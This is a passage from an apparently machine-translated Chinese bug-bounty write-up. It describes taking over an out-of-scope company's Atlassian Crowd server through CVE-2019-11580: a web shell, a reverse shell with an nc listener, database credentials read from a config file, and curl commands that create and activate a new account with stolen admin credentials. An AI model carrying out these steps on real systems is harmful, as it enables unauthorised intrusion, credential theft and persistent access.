ir">在进行快速测试</strong>的同时，我也把自己的<strong class="kh ir">重点放在了3件事情上</strong>(对于那些接受攻击性技术认证以及与之类似或者摆弄HackTheBox以及与之类似的人来说，将会熟悉这个常见的概念)，它们是:</p><ul class=""><li id="4122" class="lt lu iq kh b ki kj kl km ko lv ks lw kw lx la ly lz ma mb bi translated">对使用的帐户和密码进行测试</li><li id="ff47" class="lt lu iq kh b ki mc kl md ko me ks mf kw mg la ly lz ma mb bi translated">针对尚未实施的补丁进行测试(过时/过期版本)</li><li id="a09b" class="lt lu iq kh b ki mc kl md ko me ks mf kw mg la ly lz ma mb bi translated">针对已实施的配置错误进行测试。</li></ul><p id="ea59" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">简而言之，我通过使用简单的Google Dork找到了漏洞利用信息。</p><figure class="lb lc ld le gt nl gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi or"><img src="../Images/f596a024e567251116e9d253a95f22ed.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*j5YDmJzIzP-UUUS9.png"/></div></div><figcaption class="ns nt gj gh gi nu nv bd b be z dk translated">图14查看关于公共漏洞的信息</figcaption></figure><p id="ab72" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">在仔细查看信息后，我发现使用的版本是否受到这个未经验证的RCE问题的影响。标记为<strong class="kh ir">CVE-2019–11580</strong>。</p><p id="e0e5" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">我做的下一件事是寻找可能发布的公共漏洞。简而言之，我得到了这个链接:</p><figure class="lb lc ld le gt nl gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi os"><img src="../Images/740e78e16956c5eec3649903ef36e195.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*U_02ljHR2CVLAbgI.png"/></div></div><figcaption class="ns nt gj gh gi nu nv bd b be z dk translated">图15少数Atlassian Crowd和Crowd数据中心版本的公开利用——RCE</figcaption></figure></div><div class="ab cl mh mi hu mj" role="separator"><span class="mk bw bk ml mm mn"/><span class="mk bw bk ml mm mn"/><span class="mk bw bk ml mm"/></div><div class="ij ik il im in"><h2 id="48da" class="lk ll iq bd mp ny nz dn mt oa ob dp mx ko oc od mz ks oe of nb kw og oh nd oi bi translated">2.3.2.我怎么知道这个人是否脆弱？</h2><p id="637a" class="pw-post-body-paragraph kf kg iq kh b ki nf jr kk kl ng ju kn ko nh kq kr ks ni ku kv kw nj ky kz la ij bi translated">有一个简单的方法可以用来确定应用程序是否易受攻击。</p><p id="b842" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">我们需要做的只是访问/admin/ path中的<em class="ls"> uploadplugin.action </em>端点。如果应用程序显示错误消息“<strong class="kh ir"> HTTP状态400 —需要POST </strong>”，那么很有可能，应用程序易受此RCE的攻击(这告诉我们插件是否可用，并且可以在不需要认证的情况下使用)。</p><figure class="lb lc ld le gt nl gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi ot"><img src="../Images/c8e4baa5159773a391402fa6421f36c2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*orS_jHh3YFBXv_BW.png"/></div></div><figcaption class="ns nt gj gh gi nu nv bd b be z dk translated">图16显示了一条错误消息“需要POST”</figcaption></figure></div><div class="ab cl mh mi hu mj" role="separator"><span class="mk bw bk ml mm mn"/><span class="mk bw bk ml mm mn"/><span class="mk bw bk ml mm"/></div><div class="ij ik il im in"><h2 id="2852" class="lk ll iq bd mp ny nz dn mt oa ob dp mx ko oc od mz ks oe of nb kw og oh nd oi bi translated">2.3.3.死刑</h2><p id="acbd" class="pw-post-body-paragraph kf kg iq kh b ki nf jr kk kl ng ju kn ko nh kq kr ks ni ku kv kw nj ky kz la ij bi translated">重现这个问题非常简单。我们需要做的只是下载其中一个可以在https://github.com/jas502n/CVE-2019-11580<a class="ae lq" href="https://github.com/jas502n/CVE-2019-11580" rel="noopener ugc nofollow" target="_blank">找到的工作漏洞。</a></p><p id="6f78" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">当脚本被执行到目标时(而目标是易受攻击的)，那么web shell将自动出现。(<strong class="kh ir">没错，我们在</strong>)！</p><figure class="lb lc ld le gt nl gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi ou"><img src="../Images/8b5b59fb3809ae776ca29e924eac2d89.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*fXcYGl2Zeefxr0dJ.png"/></div></div><figcaption class="ns nt gj gh gi nu nv bd b be z dk translated">图17执行脚本</figcaption></figure><p id="eb16" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">要通过web浏览器访问web shell，那么我们只需要访问<strong class="kh ir"> /crowd/plugins/servlet/exp？cmd=command_here </strong>端点。只需将“<strong class="kh ir"> command_here </strong>”替换为另一个OS命令。</p><figure class="lb lc ld le gt nl gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi ok"><img src="../Images/f5e9f3f858be629811d585f80fcec874.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*hdxODDdERCR58wnh.png"/></div></div><figcaption class="ns nt gj gh gi nu nv bd b be z dk translated">图18根访问</figcaption></figure><p id="8f04" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">总而言之，利用这一目标的好处是:</p><ol class=""><li id="6feb" class="lt lu iq kh b ki kj kl km ko lv ks lw kw lx la ov lz ma mb bi translated">我们<strong class="kh ir">不需要任何有效的用户名或密码</strong>来执行这个。(这就是为什么它叫未认证/预认证RCE)；</li><li id="2d91" class="lt lu iq kh b ki mc kl md ko me ks mf kw mg la ov lz ma mb bi translated">第二个，<strong class="kh ir">RCE作为根用户</strong>被执行。这意味着，我们不需要做任何事情来获得根访问；</li><li id="6d4a" class="lt lu iq kh b ki mc kl md ko me ks mf kw mg la ov lz ma mb bi translated">第三个是，<strong class="kh ir">没有保护该应用程序的安全边界</strong>。因此，我们在开发目标时没有发现任何困难。</li></ol></div><div class="ab cl mh mi hu mj" role="separator"><span class="mk bw bk ml mm mn"/><span class="mk bw bk ml mm mn"/><span class="mk bw bk ml mm"/></div><div class="ij ik il im in"><h2 id="71a8" class="lk ll iq bd mp ny nz dn mt oa ob dp mx ko oc od mz ks oe of nb kw og oh nd oi bi translated">2.3.4.这还不够，我们需要一个可以与系统交互的外壳！</h2><p id="495f" class="pw-post-body-paragraph kf kg iq kh b ki nf jr kk kl ng ju kn ko nh kq kr ks ni ku kv kw nj ky kz la ij bi translated">因为我们还没有交互外壳(可以通过传递我们输入的数据与操作系统交互的外壳)，那么我们必须首先将这个外壳连接到我们的机器。</p><p id="cd0d" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">通常，我使用PentestMonkey 的<a class="ae lq" href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" rel="noopener ugc nofollow" target="_blank">反向外壳备忘单。但令人难过的是，没有命令可以将shell连接到我的机器上。最有可能的是，应用程序过滤特殊字符，如&gt; &amp;、‘和’</a></p><p id="1401" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">在这种情况下，我将简单的反向shell python脚本放在我的机器上，然后强迫目标下载它(通过使用可用的web shell)。</p><figure class="lb lc ld le gt nl gh gi paragraph-image"><div class="gh gi ow"><img src="../Images/d97ace5727423a3f083f8f083261e62e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1340/format:webp/0*pyULbGgE00_28X7I.png"/></div><figcaption class="ns nt gj gh gi nu nv bd b be z dk translated">图19 Python中简单的反向Shell脚本</figcaption></figure><figure class="lb lc ld le gt nl gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi nw"><img src="../Images/a761d988cfae6ee1f513ed53b7e2665a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*8PLt_bDenJZ89PiS.png"/></div></div><figcaption class="ns nt gj gh gi nu nv bd b be z dk translated">图20从我们的机器下载脚本</figcaption></figure><p id="b1fe" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">在这种情况下，我们最终在目标服务器上有了自己的反向shell脚本(python)。但问题是，这个脚本不可执行。因此，下一件事，我们应该做的是chmod脚本(例如与700，因为我们的访问已经是根)。</p><figure class="lb lc ld le gt nl gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi nw"><img src="../Images/96bfa5ef1767b3123555b3d2cf35d004.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*8lScs9LtBGSVmTXM.png"/></div></div><figcaption class="ns nt gj gh gi nu nv bd b be z dk translated">图21将Python脚本转换成700</figcaption></figure><p id="e501" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">因此，现在我们的脚本应该是可执行的，因为我们已经更改了权限。</p><figure class="lb lc ld le gt nl gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi nw"><img src="../Images/e10ed1fc5a921e6a7e03e19ba1bb83f3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*75bwkHSYDQVnn5DI.png"/></div></div><figcaption class="ns nt gj gh gi nu nv bd b be z dk translated">图22脚本变得可执行— rwx</figcaption></figure><p id="dd54" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">在我们的脚本被下载后，我们只需要在我们的服务器上设置监听器。</p><pre class="lb lc ld le gt lf lg lh li aw lj bi"><span id="0783" class="lk ll iq lg b gy lm ln l lo lp">$ <strong class="lg ir">nc -lvp &lt;our_port&gt;</strong></span></pre><p id="52e6" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">然后，尝试通过我们部署的web shell在目标服务器上执行python脚本:</p><figure class="lb lc ld le gt nl gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi nw"><img src="../Images/d737ce26865306816ac76098c2dacd55.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*1rVZ4zblN2eOS1h0.png"/></div></div><figcaption class="ns nt gj gh gi nu nv bd b be z dk translated">图23获得交互式外壳</figcaption></figure><figure class="lb lc ld le gt nl gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi nw"><img src="../Images/76ee5c5e063b4c5612d860654e6d9504.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*RauCD42j00Y8Xc27.png"/></div></div><figcaption class="ns nt gj gh gi nu nv bd b be z dk translated">图24 Shell作为根用户执行</figcaption></figure><p id="d7bf" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">第一次可以连接到我们的反向外壳，基本上我们还没有一个交互的外壳。所以，我们需要做的就是用python运行一个简单的命令:</p><pre class="lb lc ld le gt lf lg lh li aw lj bi"><span id="f339" class="lk ll iq lg b gy lm ln l lo lp">python -c 'import pty;pty.spawn("/bin/bash")'</span></pre><p id="7488" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">从这里开始，我们终于有了交互式外壳。我们也可以毫无顾虑地连接到数据库或其他服务。</p><p id="5c28" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><strong class="kh ir">注:</strong>详见G0tmi1k的个人博客:“<a class="ae lq" href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/" rel="noopener ugc nofollow" target="_blank">基本Linux权限提升</a>”。</p><figure class="lb lc ld le gt nl gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi ox"><img src="../Images/a61ea7f92d9a3b036d1e8550b4bd877c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*PexAKYEZWU5KeDCi.png"/></div></div><figcaption class="ns nt gj gh gi nu nv bd b be z dk translated">图25允许我们连接到可用数据库的交互式外壳</figcaption></figure></div><div class="ab cl mh mi hu mj" role="separator"><span class="mk bw bk ml mm mn"/><span class="mk bw bk ml mm mn"/><span class="mk bw bk ml mm"/></div><div class="ij ik il im in"><h2 id="b223" class="lk ll iq bd mp ny nz dn mt oa ob dp mx ko oc od mz ks oe of nb kw og oh nd oi bi translated">2.3.5.下一步是什么？</h2><p id="4f2c" class="pw-post-body-paragraph kf kg iq kh b ki nf jr kk kl ng ju kn ko nh kq kr ks ni ku kv kw nj ky kz la ij bi translated">因此，RCE最大的优势之一是，该服务器位于他们的内部网络中。当我尝试ping几个公共资产时，我也得到了一个不错的(内部IP地址)响应。是的，它的意思是，<strong class="kh ir">我们在世界上最大的ICT公司之一的内部网络中！</strong></p><p id="05ae" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">现在，还记得我们从第一和第二阶段获得并保留的许多内部信息吗？然后<strong class="kh ir">我们也可以在第三阶段使用它！</strong></p><p id="1a3c" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">最后，我们进入公司内部的旅程已经结束了。我已经报告了这个问题，并得到了很好的回应。</p><pre class="lb lc ld le gt lf lg lh li aw lj bi"><span id="5e4d" class="lk ll iq lg b gy lm ln l lo lp"><strong class="lg ir">Disclaimer:</strong> I didn’t execute any further. All I do only shows things that can be used from the data that I got from the previous stages. Just don’t do it in bug hunting without any permission.</span></pre><p id="8d4c" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><strong class="kh ir">注:</strong>虽然问题是在“范围外”的目标中发现的，但至少我在我的bug狩猎活动中实现了我的一个梦想，那就是从外部地区进入世界上一家强大的ICT公司(是的，在我看来，在bug狩猎中获得RCE和内部访问似乎比在正式的pentest工作中更难。有时候，我们会和其他朋友开玩笑，“<em class="ls">在臭虫狩猎/臭虫奖励计划中获得RCE奖——看起来像一个童话故事</em>”。</p><figure class="lb lc ld le gt nl gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi ok"><img src="../Images/c4092b8a929b353e399a98e0ebc870db.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*GQp4yGMmO3fGGsUQ.png"/></div></div><figcaption class="ns nt gj gh gi nu nv bd b be z dk translated">图26问题已经解决</figcaption></figure><figure class="lb lc ld le gt nl gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi oq"><img src="../Images/b6fa2f13a16a25a99353dfa06afa5012.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*AXlX0a4sqGTOKuZU.png"/></div></div><figcaption class="ns nt gj gh gi nu nv bd b be z dk translated">图27漂亮的回应</figcaption></figure></div><div class="ab cl mh mi hu mj" role="separator"><span class="mk bw bk ml mm mn"/><span class="mk bw bk ml mm mn"/><span class="mk bw bk ml mm"/></div><div class="ij ik il im in"><h2 id="4a2f" class="lk ll iq bd mp ny nz dn mt oa ob dp mx ko oc od mz ks oe of nb kw og oh nd oi bi translated">2.3.6.附加说明</h2><p id="2b83" class="pw-post-body-paragraph kf kg iq kh b ki nf jr kk kl ng ju kn ko nh kq kr ks ni ku kv kw nj ky kz la ij bi translated"><strong class="kh ir">2.3.6.1。登录人群数据库</strong></p><p id="72a2" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">如果你们中的一些人问我如何登录他们的数据库，这是有可能的。</p><p id="bc04" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">作为一个额外的信息，他们也在这个服务器上安装了Atlassian Confluence。老实说，我不知道Atlassian Confluence和Atlassian Crowd的整合流程，甚至不知道它是如何运作的。我想到的是，如果<strong class="kh ir">我看到一个数据库连接</strong>(通过netstat)，那么很可能在这个服务器上也有一个<strong class="kh ir">数据库连接配置</strong>(通常以明文形式存储凭证)。</p><p id="6b5e" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">搜索了一些参考资料，终于找到一篇文章，解释了凭证是否存储在<strong class="kh ir">&lt;confluence _ home&gt;/confluence . CFG . XML</strong>文件中。</p><figure class="lb lc ld le gt nl gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi ou"><img src="../Images/83b92fbf328e6094e94183f941a2b6ad.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*lYeH4JukBgaYnhNe.png"/></div></div><figcaption class="ns nt gj gh gi nu nv bd b be z dk translated">图28一篇解释数据库连接配置位置的文章</figcaption></figure><figure class="lb lc ld le gt nl gh gi paragraph-image"><div class="gh gi oy"><img src="../Images/f0c0cbedc770d92870779586c6132388.png" data-original-src="https://miro.medium.com/v2/resize:fit:1324/format:webp/0*nGd2bq_Ji2ScX9bl.png"/></div><figcaption class="ns nt gj gh gi nu nv bd b be z dk translated">图29试图找出位置</figcaption></figure><p id="0ba0" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">通过使用简单的“locate”命令(因为我不知道confluence.cfg.xml文件的确切位置)，然后我发现它是否位于/opt。</p><figure class="lb lc ld le gt nl gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi oz"><img src="../Images/c1bc20ed0715aeb236d1d201cc2278c1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*zlM-xPBYm1PZZdf-.png"/></div></div><figcaption class="ns nt gj gh gi nu nv bd b be z dk translated">图30数据库连接字符串的明文</figcaption></figure><p id="c708" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">至于其他方面，正如您在前面部分清楚看到的，我成功登录到他们的数据库。</p><figure class="lb lc ld le gt nl gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi pa"><img src="../Images/6707dedf892c35c78b9b1d21cae29af5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*hVM-MaGlhP7GeiaY.png"/></div></div><figcaption class="ns nt gj gh gi nu nv bd b be z dk translated">图31成功登录应用程序的数据库</figcaption></figure></div><div class="ab cl mh mi hu mj" role="separator"><span class="mk bw bk ml mm mn"/><span class="mk bw bk ml mm mn"/><span class="mk bw bk ml mm"/></div><div class="ij ik il im in"><p id="5962" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><strong class="kh ir">2.3.6.2。存储的密码是加密的，你能登录吗？</strong></p><p id="7377" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">是的，我相信在某些情况下(在正式活动中)，如果我们获得数据的清晰视图(例如，访问GUI)会更好，这样它可以帮助我们更好地理解识别可能存在的风险(或者识别可能存在的应用程序缺陷，或者找到可能用于其他执行的数据)。</p><p id="0ee0" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><strong class="kh ir">那么，要不要蛮力</strong>？是的，我们也可以暴力破解密码，但我认为如果我们的时间很短，这不是一个好的选择(除非你有很棒的破解机)。</p><p id="1099" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><strong class="kh ir">我们可以用新创建的密码(例如从我们自己的人群中)替换加密的密码</strong>吗？我认为这是可能的。Atlassian也在其官方门户网站上提供这种“解决方案”。简而言之，我们可以将现有的administrator (hash)密码替换为“<strong class="kh ir"> admin </strong>”的hash值。</p><figure class="lb lc ld le gt nl gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi ok"><img src="../Images/14d971b42db09d05428027e8cbe16f20.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*5VttfajAuKxzEvI_.png"/></div></div><figcaption class="ns nt gj gh gi nu nv bd b be z dk translated">图32如何替换管理员密码</figcaption></figure><pre class="lb lc ld le gt lf lg lh li aw lj bi"><span id="edf9" class="lk ll iq lg b gy lm ln l lo lp"><strong class="lg ir">Did I execute this?</strong> The answer <strong class="lg ir">is NO</strong>. Without any permission, we can’t do it. (yes, in a real attack, the Attacker will do it without asking any permissions, but kindly note that <strong class="lg ir">in bug hunting, we didn’t come with the intention to breach</strong>).</span></pre><p id="33ec" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">另一方面，替换这个密码也将使管理员/开发人员意识到是否发生了错误。</p><p id="6c1f" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">因此，在考虑不多的情况下，我选择创建一个新帐户，以便在存在允许攻击者登录现有应用程序的风险时通知程序所有者。</p><p id="22b3" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">从这里，然后我试图找出有关的可能性，创建一个新的帐户，而不需要登录到应用程序。在搜索了一些参考资料后，我终于发现只要我们有一个管理员密码crowd，通过REST这是否是可能的。</p><figure class="lb lc ld le gt nl gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi oq"><img src="../Images/e8e857f0e334ed473c9c149dbf4b4279.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*BRdfO8_PyII-b9Pb.png"/></div></div><figcaption class="ns nt gj gh gi nu nv bd b be z dk translated">图33找出存储管理员密码的文件的位置</figcaption></figure><p id="fbca" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">由于受影响的Atlassian人群的版本是v.2.x，那么这篇文章仍然有效，我们创建一个帐户。</p><figure class="lb lc ld le gt nl gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi ok"><img src="../Images/0b9fd66e041e794b30fad146718b1956.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*joe2skGe-h0PJkih.png"/></div></div><figcaption class="ns nt gj gh gi nu nv bd b be z dk translated">图34 crowd . properties文件的属性</figcaption></figure><p id="cccb" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">同样，通过使用简单的“定位”命令，我成功地找到了位置。</p></div><div class="ab cl mh mi hu mj" role="separator"><span class="mk bw bk ml mm mn"/><span class="mk bw bk ml mm mn"/><span class="mk bw bk ml mm"/></div><div class="ij ik il im in"><p id="9732" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><strong class="kh ir"> 2.3.6.2.1。通过REST创建账户</strong></p><p id="70fa" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">下面这篇文章对我创建账户帮助很大。</p><figure class="lb lc ld le gt nl gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi pb"><img src="../Images/d0b495045d1d8a37876bf3f366d29b2a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*g-BrRizSLWXBhsnj.png"/></div></div><figcaption class="ns nt gj gh gi nu nv bd b be z dk translated">图35通过REST API创建新帐户</figcaption></figure><p id="cc04" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">简而言之，应该是这样:</p><pre class="lb lc ld le gt lf lg lh li aw lj bi"><span id="5e0c" class="lk ll iq lg b gy lm ln l lo lp">curl -i -X POST <strong class="lg ir">http://subdomain.target.com</strong>/crowd/rest/usermanagement/latest/user?username=<strong class="lg ir">your_new_user_here</strong> -H 'Content-type: application/json' -H 'Accept: application/json' -u <strong class="lg ir">crowd_administrator_username_here</strong>:<strong class="lg ir">crowd_administrator_password_here</strong> -d'<br/>&gt; {<br/>&gt; "email": "<strong class="lg ir">your@email_here.tld</strong>",<br/>&gt; "name": "<strong class="lg ir">your_new_user_here</strong>",<br/>&gt; "password": {<br/>&gt; "value": "<strong class="lg ir">your_new_user_password_here</strong>"<br/>&gt; }<br/>&gt; }<br/>&gt; '</span></pre><p id="54eb" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><strong class="kh ir">注</strong>:</p><ul class=""><li id="6e80" class="lt lu iq kh b ki kj kl km ko lv ks lw kw lx la ly lz ma mb bi translated"><strong class="kh ir">您的新用户这里</strong> =表示我们想要创建的用户名</li><li id="7432" class="lt lu iq kh b ki mc kl md ko me ks mf kw mg la ly lz ma mb bi translated"><strong class="kh ir">crowd _ administrator _ username _ here</strong>=表示群组的管理员用户名</li><li id="16b9" class="lt lu iq kh b ki mc kl md ko me ks mf kw mg la ly lz ma mb bi translated"><strong class="kh ir">crowd _ administrator _ password _ here</strong>=表示群组的管理员密码</li><li id="5926" class="lt lu iq kh b ki mc kl md ko me ks mf kw mg la ly lz ma mb bi translated"><strong class="kh ir">您的@email_here.tld </strong> =表示我们希望创建的用户名的电子邮件</li><li id="2230" class="lt lu iq kh b ki mc kl md ko me ks mf kw mg la ly lz ma mb bi translated"><strong class="kh ir">your _ new _ user _ password _ here</strong>=表示我们希望用于账户的密码</li></ul><p id="b091" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">如果成功，那么我们会得到一个很好的回应:</p><pre class="lb lc ld le gt lf lg lh li aw lj bi"><span id="0364" class="lk ll iq lg b gy lm ln l lo lp">HTTP/1.1 201 Created<br/>Server: Apache-Coyote/1.1 <br/>Redacted.</span></pre><p id="dcf9" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><strong class="kh ir">完成了吗？太遗憾了，不。我们需要激活我们的帐户。事实上，(据我所知)有2种方法可以做到这一点，这是通过要求管理员激活我们的帐户(这是不可能的，对不对？)或者我们自己用其他REST API函数激活它。</strong></p></div><div class="ab cl mh mi hu mj" role="separator"><span class="mk bw bk ml mm mn"/><span class="mk bw bk ml mm mn"/><span class="mk bw bk ml mm"/></div><div class="ij ik il im in"><p id="db15" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">2.3.6.2.2。通过REST激活新账户</p><p id="fe41" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">从这篇文章中，我们将得到如何通过API激活我们的帐户的答案。</p><figure class="lb lc ld le gt nl gh gi paragraph-image"><div role="button" tabindex="0" class="nm nn di no bf np"><div class="gh gi pc"><img src="../Images/56fd5be559f88472f0962297018231a7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*YmHUplFsSHwXvOxt.png"/></div></div><figcaption class="ns nt gj gh gi nu nv bd b be z dk translated">图36教程——如何通过API激活我们的账户</figcaption></figure><p id="552c" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">简而言之，应该是这样:</p><pre class="lb lc ld le gt lf lg lh li aw lj bi"><span id="1098" class="lk ll iq lg b gy lm ln l lo lp">curl -i -u <strong class="lg ir">crowd_administrator_username_here</strong>:<strong class="lg ir">crowd_administrator_password_here</strong> -X PUT --data '{"name":"<strong class="lg ir">your_new_user_here</strong>", "active":"true"}' <strong class="lg ir">http://subdomain.target.com</strong>/crowd/rest/usermanagement/1/user?username=<strong class="lg ir">your_new_user_here</strong> --header 'Content-Type: application/json' --header 'Accept: application/json'</span></pre><p id="39c9" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><strong class="kh ir">注</strong>:</p><ul class=""><li id="1137" class="lt lu iq kh b ki kj kl km ko lv ks lw kw lx la ly lz ma mb bi 